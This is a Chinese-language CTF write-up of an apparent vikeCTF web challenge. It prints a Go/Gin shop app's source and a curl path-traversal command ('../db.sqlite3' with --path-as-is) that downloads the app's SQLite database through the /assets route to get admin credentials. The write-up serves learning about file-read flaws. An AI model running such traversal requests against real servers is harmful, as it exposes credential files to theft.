连chatgpt都比我会审计源码（下次做AWDP真要搞一个chatgpt用吧）

源码如下

```go
package main

import (
	"crypto/subtle"
	"embed"
	"fmt"
	"html/template"
	"net/http"
	"os"
	"path/filepath"

	"github.com/gin-gonic/gin"
	"github.com/jmoiron/sqlx"
	_ "github.com/mattn/go-sqlite3"
)

//go:embed views
var viewFS embed.FS

func must(err error) {
	if err != nil {
		fmt.Fprintln(os.Stderr, "Fatal error:", err)
		os.Exit(1)
	}
}

var flag string = os.Getenv("FLAG")

type Cents int

func (c Cents) String() string {
	return fmt.Sprintf("$%v.%02d", int(c)/100, int(c)%100)
}

type Listing struct {
	ID          string
	Title       string
	Description string
	PriceCents  Cents `db:"priceCents"`
	Image       string
}

type User struct {
	Username string
	Password string
}

func main() {
	db := sqlx.MustOpen("sqlite3", "file:db.sqlite3")

	e := gin.Default()
	e.SetHTMLTemplate(template.Must(template.ParseFS(viewFS, "views/**")))

	e.GET("/", func(c *gin.Context) {
		listings := make([]Listing, 0)
		err := db.Select(&listings, "SELECT * FROM listing;")
		if err != nil {
			c.AbortWithError(http.StatusInternalServerError, err)
			return
		}
		c.HTML(http.StatusOK, "index.html", gin.H{"Listings": listings})
	})
	e.GET("/search", func(c *gin.Context) {
		query := c.Query("q")
		listings := make([]Listing, 0)
		err := db.Select(&listings, `
			SELECT *
			FROM listing
			WHERE title LIKE '%' || ? || '%'
			OR description LIKE '%' || ? || '%';
		`, query, query)
		if err != nil {
			c.AbortWithError(http.StatusInternalServerError, err)
			return
		}
		c.HTML(http.StatusOK, "search.html", gin.H{
			"Listings": listings,
			"Query":    query,
		})
	})
	e.GET("/product", func(c *gin.Context) {
		id := c.Query("id")
		var listing Listing
		err := db.Get(&listing, "SELECT * from listing WHERE id = ?;", id)
		if err != nil {
			c.AbortWithError(404, err)
			return
		}
		c.HTML(http.StatusOK, "product.html", listing)
	})
	e.GET("/assets", func(c *gin.Context) {
		id := c.Query("id")
		path := filepath.Join("assets", filepath.Clean(id))
		c.File(path)
	})
	e.GET("/cart", underConstruction)
	e.GET("/admin", func(c *gin.Context) {
		cookie, err := c.Cookie("FLAG")
		if err != nil || subtle.ConstantTimeCompare([]byte(cookie), []byte(flag)) == 0 {
			c.HTML(http.StatusOK, "admin.html", nil)
			return
		}
		c.String(http.StatusOK, flag)
	})
	e.POST("/admin", func(c *gin.Context) {
		username := c.PostForm("username")
		password := c.PostForm("password")
		var user User
		err := db.Get(&user, "SELECT * FROM user WHERE username = ?", username)
		if err != nil {
			c.HTML(http.StatusUnauthorized, "admin.html", "Username or password is incorrect")
			return
		}
		if subtle.ConstantTimeCompare([]byte(password), []byte(user.Password)) == 0 {
			c.HTML(http.StatusUnauthorized, "admin.html", "Username or password is incorrect")
			return
		}
		c.Writer.Header().Add("Set-Cookie", "FLAG="+flag)
		c.Writer.Header().Add("Content-Type", "text/plain")
		c.Writer.WriteString(flag)
	})

	if os.Getenv("LIVE_RELOAD") != "" {
		e.Use(func(c *gin.Context) {
			e.LoadHTMLGlob("views/**")
		})
	}

	must(e.Run("0.0.0.0:8080"))
}

func underConstruction(c *gin.Context) {
	c.HTML(http.StatusOK, "under-construction.html", gin.H{"BackURL": c.Request.Referer()})
}

```

一直在思考在/admin路由下如何进行注入什么的来get到管理员权限，

后面看wp，问题在/assets路由下，可以构造

```shell
curl 'http://35.94.129.106:3001/assets?id=../db.sqlite3' --path-as-is -o db.sqlite3
```

来实现任意文件读取。

这里能想到../db.sqlite3是因为上面源码有显示

然后在ubuntu中读取该数据库即可获取账号密码

![image-20240319153832322](C:/Users/86186/Desktop/write-up/ctfs/vikeCTF/assets/image-20240319153832322.png)

注：直接把main.go丢给chatgpt都可以分析出错误

![image-20240319153900913](C:/Users/86186/Desktop/write-up/ctfs/vikeCTF/assets/image-20240319153900913.png)

第五个